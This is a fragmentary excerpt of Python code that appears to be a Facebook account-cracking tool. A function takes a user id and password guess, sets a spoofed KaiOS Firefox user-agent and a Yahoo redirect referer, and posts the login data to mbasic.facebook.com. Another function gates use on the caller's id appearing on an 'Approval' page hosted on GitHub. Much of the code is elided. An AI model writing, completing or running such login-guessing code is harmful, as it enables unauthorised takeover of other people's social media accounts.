...
def menu_apikey():
  ...
  try:
    httpCaht = requests.get("https://github.com/sajjad2521/Test.py/blob/main/Approval").text
    if id in httpCaht:
...
def a(uid,pwx,tl):
    ...
    'referer': 'https://r.search.yahoo.com/_ylt=Awr1Sh3bGl5kgV4EwTqc6CU5;_ylu=Y29sbwMEcG9zAzMEdnRpZAMEc2VjA3Ny/RV=2/RE=1683917660/RO=10/RU=https%3a%2f%2fmbasic.facebook.com%2f%3f_rdr%2f/RK=2/RS=F4B0TwQeJOCLomEsNnHMDW5KQm0-',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            lo = session.post('https://mbasic.facebook.com/?_rdr/', data=log_data,headers=header_freefb).text
